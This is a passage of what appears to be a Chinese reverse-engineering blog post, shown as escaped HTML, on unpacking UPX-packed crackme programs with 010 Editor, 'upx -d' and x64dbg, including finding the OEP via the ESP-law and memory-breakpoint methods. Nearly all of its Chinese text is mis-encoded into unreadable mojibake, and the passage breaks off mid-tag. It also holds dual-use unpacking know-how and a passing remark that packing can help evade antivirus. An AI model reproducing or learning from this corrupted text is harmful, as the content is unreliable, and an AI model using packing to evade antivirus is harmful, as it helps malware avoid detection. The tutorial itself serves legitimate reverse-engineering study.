    &gt;CRACKME&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://9unkk.github.io//Download/unpacking/CRACKME%20UPX.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CRACKME UPX&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è§£å‹å¯†ç ï¼š9unk&lt;/p&gt;
&lt;p&gt;ç›®æ ‡ï¼šåˆæ­¥å­¦ä¹ è„±å£³æ­¥éª¤ï¼Œäº†è§£OEPï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰å’Œ IATï¼ˆImport Address Tableï¼‰&lt;/p&gt;
&lt;h1 id=&#34;2-å£³&#34;&gt;2. å£³
&lt;/h1&gt;&lt;p&gt;PE ï¼ˆPoreable Executableï¼‰ä¹Ÿå°±æ˜¯EXEå’ŒDLLæ–‡ä»¶æ‰€å…·æœ‰çš„&lt;strong&gt;å‹ç¼©ã€åŠ å¯†ã€ä¿æŠ¤&lt;/strong&gt;ä½œç”¨çš„ä¸œè¥¿ï¼Œå½“ç„¶åŠ å£³ä¹Ÿå¯ä»¥æˆä¸ºæˆ‘ä»¬ç»•è¿‡æ€è½¯çš„ä¸€ç§æ–¹å¼ï¼ˆç ”ç©¶ä¸­ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 152; 
			flex-basis: 366px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504.png&#34; data-size=&#34;827x542&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504.png&#34;
			width=&#34;827&#34;
			height=&#34;542&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504_hu16932659265732478200.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504_hu1388134159817743508.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åŠ å£³çš„è¿‡ç¨‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å°†å¾…åŠ å£³ç¨‹åºå…¨éƒ¨è¿›è¡ŒåŠ å¯†&lt;/li&gt;
&lt;li&gt;å£³å­ç¨‹åºä¸­æ–°å¢ä¸€æ®µè§£å¯†ç¨‹åº&lt;/li&gt;
&lt;li&gt;ä¿®æ”¹å£³å­ç¨‹åºçš„OEPåˆ°è§£å¯†ç¨‹åºå…¥å£å¤„&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;3-å£³è¿è¡ŒåŸç†ä»¥upxä¸ºä¾‹&#34;&gt;3. å£³è¿è¡ŒåŸç†ï¼ˆä»¥UPXä¸ºä¾‹ï¼‰
&lt;/h1&gt;&lt;h3 id=&#34;é¦–å…ˆå¯¹ç¨‹åºè¿›è¡Œè§£å¯†è§£å‹ç¼©ç„¶åå†æ‰§è¡Œç¨‹åº&#34;&gt;é¦–å…ˆå¯¹ç¨‹åºè¿›è¡Œè§£å¯†ï¼ˆè§£å‹ç¼©ï¼‰ç„¶åå†æ‰§è¡Œç¨‹åº
&lt;/h3&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 182; 
			flex-basis: 438px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444.png&#34; data-size=&#34;741x406&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444.png&#34;
			width=&#34;741&#34;
			height=&#34;406&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444_hu9752463926111459461.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444_hu3717127443536810682.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒPEæ–‡ä»¶ä½¿ç”¨UPXå·¥å…·è¿›è¡ŒåŠ å£³ï¼ˆå‹ç¼©ï¼‰ï¼Œå°†&amp;quot;èŠ‚1&amp;quot;å’Œ&amp;quot;èŠ‚2&amp;quot;å‹ç¼©åˆ°&amp;quot;å‹ç¼©æ•°æ®ä¸­&amp;quot;,å¹¶ä¸”åœ¨&amp;quot;æ–°PE&amp;quot;ä¸­å¢åŠ ä¸€æ®µè§£å¯†ï¼ˆè§£å‹ï¼‰ç¨‹åºï¼Œå°†ç¨‹åºæ¢å¤ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;4-upxåŠ å£³åŸç†&#34;&gt;4. UPXåŠ å£³åŸç†
&lt;/h1&gt;&lt;p&gt;UPXåŠ å£³æ˜¯ä¸€ç§å‹ç¼©ä¸åŠ å¯†æŠ€æœ¯ï¼Œå®ƒå°†å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œå‹ç¼©ã€åŠ å¯†å¹¶é‡æ–°åŒ…è£…ï¼Œä»¥è¾¾åˆ°ä¿æŠ¤ç¨‹åºçš„ç›®çš„ã€‚åŠ å£³åçš„ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šè‡ªåŠ¨è§£å‹ã€è§£å¯†å¹¶æ‰§è¡ŒåŸå§‹ç¨‹åºã€‚è¿™ç§åŠ å£³æ–¹å¼å¯ä»¥æœ‰æ•ˆé˜²æ­¢ç¨‹åºè¢«è½»æ˜“åç¼–è¯‘æˆ–ä¿®æ”¹ï¼Œä»è€Œæé«˜è½¯ä»¶çš„å®‰å…¨æ€§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;41-upxåŠ å£³è¿‡ç¨‹upxå£³ultimate-packer-for-executablesç”¨äºå¯æ‰§è¡Œæ–‡ä»¶å‹ç¼©å‡å°æ–‡ä»¶å¤§å°åœ¨è¿è¡Œæ—¶è§£å‹ç¼©&#34;&gt;4.1 UPXåŠ å£³è¿‡ç¨‹ï¼ˆUPXå£³ï¼ŒUltimate Packer for eXecutablesï¼Œç”¨äºå¯æ‰§è¡Œæ–‡ä»¶å‹ç¼©ï¼Œå‡å°æ–‡ä»¶å¤§å°ï¼Œåœ¨è¿è¡Œæ—¶è§£å‹ç¼©ï¼‰
&lt;/h2&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 340; 
			flex-basis: 817px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999.png&#34; data-size=&#34;1522x447&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999.png&#34;
			width=&#34;1522&#34;
			height=&#34;447&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999_hu15627057886826699581.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999_hu17127670401019429523.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;â€‹	åˆå§‹åŒ–ï¼šè¿›ç¨‹å¯åŠ¨åï¼Œç”³è¯·å†…å­˜ï¼Œå†…éƒ¨åŒ…å«ç©ºèŠ‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å…ˆæ˜ å°„å¤´éƒ¨ï¼Œå½“ç„¶ä¹Ÿè¦å¯¹peå¤´è¿›è¡Œæ“ä½œ&lt;/li&gt;
&lt;li&gt;æ•°æ®æ˜ å°„ï¼ŒæŠŠè§£å‹ç¼©ä»£ç å’Œå‹ç¼©æ•°æ®æ˜ å°„è¿›å†…å­˜&lt;/li&gt;
&lt;li&gt;æŠŠå„ç§è¡¨è¿›è¡Œå¤„ç†&lt;/li&gt;
&lt;li&gt;è¿è¡Œå‹ç¼©ä»£ç ï¼Œè·‘å‹ç¼©æ•°æ®&lt;/li&gt;
&lt;li&gt;è¿˜åŸæ•°æ®ï¼Œå¡«å……&lt;/li&gt;
&lt;li&gt;è¡Œå®Œè§£å‹ç¼©ä»£ç åï¼Œè·‘åˆ°èŠ‚åŒº1å»æ‰§è¡ŒåŸæ¥çš„åŠŸèƒ½ï¼ˆä¼šå­˜åœ¨å¤§è·³ï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 209; 
			flex-basis: 502px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682.png&#34; data-size=&#34;2417x1154&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682.png&#34;
			width=&#34;2417&#34;
			height=&#34;1154&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682_hu466794940457788533.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682_hu4206072420395285593.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;42-å¸¸è§upxé­”æ”¹æƒ…å†µ&#34;&gt;4.2 å¸¸è§UPXé­”æ”¹æƒ…å†µ
&lt;/h2&gt;&lt;p&gt;åŒºæ®µåè¢«ä¿®æ”¹UPX â†’ 1PX ä½¿ç”¨010 Editorä¿®æ”¹å›å» å¦‚å›¾&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 653; 
			flex-basis: 1567px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677.png&#34; data-size=&#34;712x109&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677.png&#34;
			width=&#34;712&#34;
			height=&#34;109&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677_hu15025477382756501142.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677_hu6133173021909086757.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å°†è½¯ä»¶é€šè¿‡010 Editoræ‰“å¼€ï¼Œå¯ä»¥å‘ç°æ˜ç¡®çš„UPXå¤´éƒ¨ï¼Œæ­¤æ—¶ä½¿ç”¨Dieå¯ä»¥è½»æ¾è¯†åˆ«ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹UPXå¤´éƒ¨ä¿¡æ¯ä¸º1PXæ—¶ï¼Œæ­¤æ—¶ç¨‹åºä»»ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½¿ç”¨Dieè¯†åˆ«åˆ°UPXä½†æ˜¯æ— æ³•å‘ç°å…·ä½“ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ­¤æ—¶ä½¿ç”¨UPX -d è¿›è¡Œè„±å£³æ˜¯å¤±è´¥çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 183; 
			flex-basis: 439px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732.png&#34; data-size=&#34;826x451&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732.png&#34;
			width=&#34;826&#34;
			height=&#34;451&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732_hu10593901304641541934.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732_hu14627091256183345765.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 439; 
			flex-basis: 1054px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450.png&#34; data-size=&#34;1094x249&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450.png&#34;
			width=&#34;1094&#34;
			height=&#34;249&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450_hu10678774893314130376.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450_hu14979182918841928929.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-è„±å£³&#34;&gt;5. è„±å£³
&lt;/h1&gt;&lt;h2 id=&#34;51-ç›´æ¥è„±å£³&#34;&gt;5.1 ç›´æ¥è„±å£³
&lt;/h2&gt;&lt;p&gt;å¦‚æœèƒ½ç›´æ¥è¯†åˆ«åˆ°UPXå£³çš„è¯ï¼Œç›´æ¥ä½¿ç”¨UPX -d è¿›è¡Œè„±å£³å¦‚ä¸‹&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 431; 
			flex-basis: 1036px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589.png&#34; data-size=&#34;1041x241&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589.png&#34;
			width=&#34;1041&#34;
			height=&#34;241&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589_hu1847525015121275268.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589_hu1239597582657054021.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;52-æ‰‹åŠ¨è„±å£³x64dbg&#34;&gt;5.2 æ‰‹åŠ¨è„±å£³(x64dbg)
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;è„±å£³åŸºæœ¬æ­¥éª¤ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;å¯»æ‰¾ OEP&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è½¬å‚¨&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ä¿®å¤ IATï¼ˆä¿®å¤å¯¼å…¥è¡¨ï¼‰&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ£€æŸ¥ç›®æ ‡ç¨‹åºæ˜¯å¦å­˜åœ¨ AntiDump ç­‰ç»„ç»‡ç¨‹åºè¢«è½¬å‚¨çš„ä¿æŠ¤æªæ–½ï¼Œå¹¶å°è¯•ä¿®å¤è¿™äº›é—®é¢˜ã€‚&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;å¯»æ‰¾OEPï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å•æ­¥è·Ÿè¸ªæ³•ï¼šä¸»è¦ä½¿ç”¨ â€œF8â€ å’Œ â€œF4â€ è¿™ä¸¤ä¸ªå¿«æ·é”®ï¼Œä¸€æ­¥ä¸€æ­¥åˆ†ææ¯ä¸€æ¡æ±‡ç¼–èƒŒåæ‰€ä»£è¡¨çš„æ„æ€ï¼Œå°†å£³ä»£ç è¯»æ‡‚ï¼Œä»è€Œæ‰¾åˆ°åŸå§‹ OEP ç„¶åè„±å£³ã€‚&lt;/li&gt;
&lt;li&gt;ESPå®šå¾‹æ³•ï¼šä¸€èˆ¬åŠ å£³ç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œä¼šå…ˆæ‰§è¡Œå£³ä»£ç ï¼Œç„¶ååœ¨å†…å­˜ä¸­æ¢å¤è¿˜åŸåŸç¨‹åºï¼Œå†è·³è½¬åˆ°åŸå§‹OEPï¼Œæ‰§è¡ŒåŸç¨‹åºçš„ä»£ç ã€‚è¿™äº›å£³ä»£ç é¦–å…ˆä¼šä½¿ç”¨ PUSHAD æŒ‡ä»¤ä¿å­˜å¯„å­˜å™¨ç¯å¢ƒï¼Œåœ¨è§£å¯†å„ä¸ªåŒºæ®µå®Œæ¯•ï¼Œè·³å¾€ OEP ä¹‹å‰ä¼šä½¿ç”¨ POPAD æŒ‡ä»¤æ¢å¤å¯„å­˜å™¨ç¯å¢ƒã€‚&lt;/li&gt;
&lt;li&gt;å†…å­˜é•œåƒæ³•ï¼šåœ¨åŠ å£³ç¨‹åºæ‰§è¡Œæ—¶ï¼Œä¼šå…ˆå°†æºç¨‹åºçš„ â€œCODEâ€ å’Œ â€œDATAâ€ åŒºæ®µè§£å‹\è§£å¯†å¹¶è½½å…¥å†…å­˜ï¼Œç„¶åå†è½½å…¥ â€œrsrcâ€ èµ„æºåˆ°å†…å­˜ä¸­ï¼Œæœ€åè·³åˆ° OEP æ‰§è¡Œè§£å¯†åçš„ç¨‹åºã€‚å†…å­˜é•œåƒæ³•å°±æ˜¯åœ¨ rsrs å…ˆè®¾ç½®ä¸€ä¸ªå†…å­˜æ‰§è¡Œæ–­ç‚¹ï¼Œå½“ç¨‹åºåœä¸‹æ¥çš„æ—¶å€™è¯´æ˜ç¨‹åºå·²ç»è§£å‹\è§£å¯†å®Œæˆã€‚æ­¤æ—¶å†åˆ° â€œDATAâ€ åŒºæ®µè®¾ç½®å†…å­˜æ‰§è¡Œæ–­ç‚¹ï¼Œç¨‹åºä¸‹ä¸€æ¬¡ä¼šåœåœ¨ OEP å…¥å£ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€æ­¥åˆ°è¾¾OEPï¼ˆğŸ˜€.jpgï¼‰ï¼šä½¿ç”¨å¿«æ·é”® â€œCtrl+Bâ€ æœç´¢åå…­è¿›åˆ¶å­—ç¬¦ä¸² â€œE9 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00â€ï¼Œå³å¯æ‰¾åˆ°è·³è½¬ OEP çš„ä½ç½®ï¼›ä½¿ç”¨å¿«æ·é”® â€œCtrl+Fâ€ æœç´¢ popadã€‚æ‰¾çš„ popad éœ€è¦æ»¡è¶³ï¼Œåœ¨ç¨‹åºè¿”å›æ—¶ï¼Œå£³ç¨‹åºå¸Œæœ›æ¢å¤ç°åœºç¯å¢ƒçš„åœ°æ–¹ã€‚ä¹Ÿå°±æ˜¯é è¿‘ jmp å’Œ return çš„åœ°æ–¹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;521-espå®šå¾‹&#34;&gt;5.2.1 ESPå®šå¾‹
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;F9ï¼Œè¿è¡Œåˆ°pushadæŒ‡ä»¤ï¼ŒF7æ‰§è¡Œåˆ°ä¸‹ä¸€è¡Œæ±‡ç¼–æŒ‡ä»¤ï¼Œæ­¤æ—¶å¯„å­˜å™¨çš„å€¼å­˜å‚¨åˆ°æ ˆé¡¶ï¼Œä¹Ÿå°±æ˜¯ esp çš„ä½ç½®ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 193; 
			flex-basis: 464px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859.png&#34; data-size=&#34;2556x1322&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859.png&#34;
			width=&#34;2556&#34;
			height=&#34;1322&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859_hu18371772899292707688.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859_hu3081928968583268781.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;å³å‡» esp å¯„å­˜å™¨ï¼Œé€‰æ‹©åœ¨å†…å­˜ä¸­è·³è½¬ã€‚æ­¤æ—¶æ‰å†…å­˜çª—å£å¯ä»¥çœ‹åˆ°å½“å‰å­˜å‚¨çš„å¯„å­˜å™¨å€¼ï¼Œå¹¶å¦‚å›¾è®¾ç½®ç¡¬ä»¶è®¿é—®æ–­ç‚¹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 186; 
			flex-basis: 447px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281.png&#34; data-size=&#34;2558x1373&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281.png&#34;
			width=&#34;2558&#34;
			height=&#34;1373&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281_hu8192906993186461438.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281_hu14507023427029792207.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;â€œF9â€ è¿è¡Œç¨‹åºåï¼Œç¨‹åºæ–­åœ¨å¦‚ä¸‹ä½ç½®ã€‚ä¸‹é¢æœ‰ä¸ª jmp æŒ‡ä»¤ï¼Œè·³è½¬åˆ° OEP å¤„ã€‚OEPåœ°å€ä¸ºï¼š0x00409CAD&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 186; 
			flex-basis: 447px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060.png&#34; data-size=&#34;2556x1371&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060.png&#34;
			width=&#34;2556&#34;
			height=&#34;1371&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060_hu8362997799888596031.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060_hu128348868784203625.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;522-å†…å­˜é•œåƒæ³•&#34;&gt;5.2.2 å†…å­˜é•œåƒæ³•
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;è½½å…¥ UPX ç¨‹åºï¼Œä½¿ç”¨å¿«æ·é”® â€œAlt+Mâ€ è¿›å…¥åˆ°å†…å­˜è§†å›¾ï¼Œå¯¹ â€œ.rsrcâ€ åŒºæ®µè®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 444px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239.png&#34; data-size=&#34;2557x1380&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239.png&#34;
			width=&#34;2557&#34;
			height=&#34;1380&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239_hu16334476667518539202.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239_hu16381686801701929950.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;â€œF9â€ è¿è¡Œupxç¨‹åºåˆ° â€œrsrcâ€ åŒºæ®µï¼Œæ­¤æ—¶å‰é¢ä¸¤ä¸ªåŒºæ®µå·²ç»è§£å¯†å¥½äº†ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 446px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546.png&#34; data-size=&#34;2560x1377&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546.png&#34;
			width=&#34;2560&#34;
			height=&#34;1377&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546_hu12032007515512591565.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546_hu8140839394873503015.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;å†æ¬¡åˆ°å†…å­˜è§†å›¾ï¼Œä½¿ç”¨ â€œF2â€ å¯¹ â€œCODEâ€ åŒºæ®µè®¾ç½®å†…å­˜æ‰§è¡Œæ–­ç‚¹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624.png&#34; data-size=&#34;2560x1379&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624.png&#34;
			width=&#34;2560&#34;
			height=&#34;1379&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624_hu9810044325371938091.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624_hu11240202325385432193.png 1024w&#34;
